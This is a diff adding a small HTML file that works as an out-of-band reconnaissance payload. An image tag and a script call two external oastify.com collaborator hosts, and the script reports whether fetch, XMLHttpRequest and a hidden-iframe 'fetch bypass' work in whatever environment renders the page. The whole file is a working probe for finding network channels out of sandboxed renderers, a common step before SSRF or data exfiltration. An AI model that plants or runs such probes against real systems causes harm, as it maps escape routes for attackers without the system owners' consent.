@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<img src="http://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com/check.png">
+<script>
+(async () => {
+  const signal = (status) => {
+    const img = new Image();
+    img.src = `https://cvb1dskcd13nmeazctzwq7kpigo7c30s.oastify.com/${status}`;
+  };
+
+  // Check fetch
+  if (typeof window.fetch === 'function') {
+    signal('fetch-available');
+  } else {
+    signal('fetch-blocked');
+  }
+
+  // Check XHR
+  if (typeof window.XMLHttpRequest === 'function') {
+    signal('xhr-available');
+  } else {
+    signal('xhr-blocked');
+  }
+
+  // Check iframe fetch bypass
+  try {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    if (typeof iframe.contentWindow.fetch === 'function') {
+      signal('iframe-fetch-available');
+    } else {
+      signal('iframe-fetch-blocked');
+    }
+  } catch (e) {
+    signal('iframe-fetch-error');
+  }
+})();
+</script>
+</html>
